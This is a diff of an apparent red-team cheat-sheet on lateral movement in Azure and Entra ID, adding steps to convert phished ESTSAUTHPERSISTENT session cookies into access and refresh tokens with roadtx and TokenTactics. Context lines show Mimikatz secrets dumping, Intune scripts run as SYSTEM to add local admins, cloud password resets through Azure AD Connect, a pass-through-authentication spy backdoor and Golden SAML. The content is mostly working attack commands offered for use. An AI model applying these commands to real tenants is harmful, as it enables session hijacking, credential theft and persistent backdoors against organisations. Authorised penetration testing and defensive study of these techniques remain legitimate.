@@ -1,23 +1,23 @@
 # Lateral movement
-
-## Azure AD machine --> Azure (or another Azure AD Machine)
-* [Pass the certificate](#Pass-the-certificate)
-* [Pass the PRT](#Pass-the-PRT) 
-
 * [General](#General)
-  * [Access and RefreshTokens](#Access-and-Refresh-Tokens)
-* [Azure AD To On-premises](#Azure-AD-To-On-Premises)
+  * [Access and RefreshTokens & Cookies](#Access-and-Refresh-Tokens-&-Cookies)
+    * [Request access tokens](#Request-access-tokens)
+    * [Stealing Access Tokens](/cloud/azure/post-exploitation.md#Stealing-tokens)
+    * [From EST cookies to Access and Refresh tokens](#From-EST-cookies-to-Access-and-Refresh-tokens)
+* [Entra ID To other machines](#Entra-ID-To-Other-Machines)
+  * [Pass the certificate](#Pass-the-certificate)
+  * [Pass the PRT](#Pass-the-PRT)
+* [Entra ID To On-premises](#Entra-ID-To-On-Premises)
   * [Intune](#Intune)
   * [Application proxy abuse](#Application-proxy-abuse)
-
-## On-Prem --> Azure AD
-* [Azure AD Connect](#Azure-AD-Connect)
-  * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-Abuse)
-  * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-Abuse)
-  * [Federation (ADFS)](#Federation-ADFS)
+* [On premises to Entra ID](#On-premises-to-Entra-ID)
+  * [Azure AD Connect](#Azure-AD-Connect)
+    * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-Abuse)
+    * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-Abuse)
+    * [Federation (ADFS)](#Federation-ADFS)
 
 ## General
-### Access and Refresh Tokens
+### Access and Refresh Tokens & Cookies
 - The Identity Platform (Entra ID) uses thee types of bearer tokens.
 	- ID Token - Contains basic information about the user
 		- Expiry is 1 hour
@@ -63,11 +63,106 @@ $ARMAccessToken = (Invoke-RefreshToAzureManagementToken -domain <COMPANY>.onmicr
 ### Stealing access tokens
 - [Link to Post-Exploitation](/cloud/azure/post-exploitation.md#Stealing-tokens)
 
-## Azure AD To On Premises
-### Pass the certificate
-- To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.
+### From EST cookies to Access and Refresh tokens
+### RoadTx
+#### Get Access + Refresh Tokens
+- https://github.com/dirkjanm/ROADtools
+- Copy the `ESTSAUTHPERSISTENT` cookie from evilnginx2!
+- Use the `--resource` parameter to choose which azure resource
+	- `msgraph`    - https://graph.microsoft.com/
+	- `aadgraph`   - https://graph.windows.net/
+	- `azurerm`    - https://management.core.windows.net/
+- Use the `--client` parameter to choose which client
+	- `azps`, `azcli`, `msteams`, `edge`
 
-#### Check if machine is Azure AD Joined
+```
+roadtx interactiveauth --estscookie "0.Aa4Aq..." --resource msgraph
+
+$MsGraphAccessToken = (cat .roadtools_auth| ConvertFrom-Json).accessToken
+```
+
+#### Get access token info
+```
+roadtx describe
+```
+- Or decode it in https://jwt.io, get access token with `(cat .roadtools_auth| ConvertFrom-Json).accessToken`
+
+#### Retrieve other access tokens
+- Abuses [FOCI](#Family-of-Client-IDs-(FOCI)-FRT-Abuse)
+- Use the `--resource` parameter to choose which azure resource
+	- `msgraph`    - https://graph.microsoft.com/
+	- `aadgraph`   - https://graph.windows.net/
+	- `azurerm`    - https://management.core.windows.net/
+
+```
+roadtx gettokens --refresh-token file --resource azurerm
+
+$ARMAccessToken = (cat .roadtools_auth| ConvertFrom-Json).accessToken
+```
+
+```
+roadtx gettokens --refresh-token file --resource aadgraph
+
+$AadGraphAccessToken = (cat .roadtools_auth| ConvertFrom-Json).accessToken
+```
+
+### TokenTactics
+#### Get MSGraph Access Token
+- https://github.com/rotarydrone/TokenTactics
+- For some reason [TokenTacticsV2](https://github.com/f-bader/TokenTacticsV2) didn't work for me
+- Copy the `ESTSAUTHPERSISTENT` cookie, also try the `ESTAUTH` cookie after!
+
+```
+Import-Module C:\Tools\Azure\TokenTacticsEST\TokenTactics\TokenTactics.psd1
+
+Get-AzureTokenFromESTSCookie -ESTSAuthCookie "<ESTSAUTHPERSISTENT cookie>" -Client MSTeams
+$response
+
+$GraphAccessToken = $response.access_token
+```
+
+- From the response we can see its a FOCI token
+```
+...snip
+foci           : 1
+.../snip
+```
+
+#### Get other access tokens
+- Abuses [FOCI](#Family-of-Client-IDs-(FOCI)-FRT-Abuse)
+
+```
+Get-Command *Invoke-RefreshTo*
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Function        Invoke-RefreshToAzureCoreManagementToken           0.0.2      TokenTactics
+Function        Invoke-RefreshToAzureManagementToken               0.0.2      TokenTactics
+Function        Invoke-RefreshToDODMSGraphToken                    0.0.2      TokenTactics
+Function        Invoke-RefreshToGraphToken                         0.0.2      TokenTactics
+Function        Invoke-RefreshToMAMToken                           0.0.2      TokenTactics
+Function        Invoke-RefreshToMSGraphToken                       0.0.2      TokenTactics
+Function        Invoke-RefreshToMSManageToken                      0.0.2      TokenTactics
+Function        Invoke-RefreshToMSTeamsToken                       0.0.2      TokenTactics
+Function        Invoke-RefreshToOfficeAppsToken                    0.0.2      TokenTactics
+Function        Invoke-RefreshToOfficeManagementToken              0.0.2      TokenTactics
+Function        Invoke-RefreshToOutlookToken                       0.0.2      TokenTactics
+Function        Invoke-RefreshToSharepointOnlineToken              0.0.2      TokenTactics
+Function        Invoke-RefreshToSubstrateToken                     0.0.2      TokenTactics
+Function        Invoke-RefreshToYammerToken                        0.0.2      TokenTactics
+```
+
+```
+$GraphAccessToken = (Invoke-RefreshToMSGraphToken -domain <DOMAIN>.onmicrosoft.com -refreshToken $tokens.refresh_token).access_token
+
+$ARMAccessToken = (Invoke-RefreshToAzureManagementToken -domain <COMPANY>.onmicrosoft.com -refreshToken $response.refresh_token).access_token
+```
+
+## Entra ID To Other Machines
+### Pass the certificate
+- To go from Entra ID machine to other Entra ID machine if the user has administrative access to other machines.
+
+#### Check if machine is Entra ID Joined
 - Check for IsDeviceJoined : YES
 ```
 dsregcmd /status
@@ -147,7 +242,8 @@ Get-AADIntUserPRTToken
 - Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!
 - Can now also access portal.azure.com
 
-## Intune
+## Entra ID To On Premises
+### Intune
 - a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
 - If user had Intune Administrator role go to https://endpoint.microsoft.com/#home and login (or from a ticket (PRT)
 - Go to Devices -> All Devices to check devices enrolled to Intune:
@@ -163,7 +259,7 @@ Add-LocalGroupMember -Group Administrators -Member <USERNAME>
 - Select `Run script in 64 bit PowerShell Host`
 - On the assignment page select "Add all users" and "add all devices"
 
-## Application proxy abuse
+### Application proxy abuse
 - The application behind the proxy may have vulnerabilities to access the on-prem environment.
 #### Enumerate application which has a application proxy configured
 ```
@@ -188,10 +284,10 @@ Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINC
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 ```
 
-# On-Prem --> Azure AD
+## On premises to Entra ID
 - https://aadinternals.com/post/on-prem_admin/
 
-## Azure AD Connect
+### Azure AD Connect
 - When Azure AD Connect is configured. The `SYNC_` account and `MSOL_` account are created. (or `AAD_` if installed on a DC)
 - The `SYNC_` account has the role `Directory Synchronization Accounts` and can reset any password within the cloud and the `MSOL_` and `AAD_` account have DCSync rights.
 - The role is now shown in the Azure portal [Documentation](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#roles-not-shown-in-the-portal)
@@ -234,7 +330,7 @@ Get-ADSyncDatabaseConfiguration
 ```
 - Edit line 4 of the script
 
-## Password Hash Sync Abuse
+### Password Hash Sync Abuse
 #### Turn on password hash sync
 - AAD Connect service account can turn on Password hash sync
 ```
@@ -286,7 +382,7 @@ Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
 
 - Access Azure portal using the new password.
 
-## Pass Through Authentication PTA Abuse
+### Pass Through Authentication PTA Abuse
 - Once we have admin access to an Azure AD connect server running PTA agent.
 - Not reliable method to check if PTA is used, Check if module is available ```Get-Command -Module PassthroughAuthPSModule```
 - Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!
@@ -313,7 +409,7 @@ Import-Module .\AADInternals.psd1
 Install-AADIntPTASpy
 ```
 
-## Federation-ADFS
+### Federation-ADFS
 - ADFS = Active Directory Federation Services
 - Golden SAML Attack
 
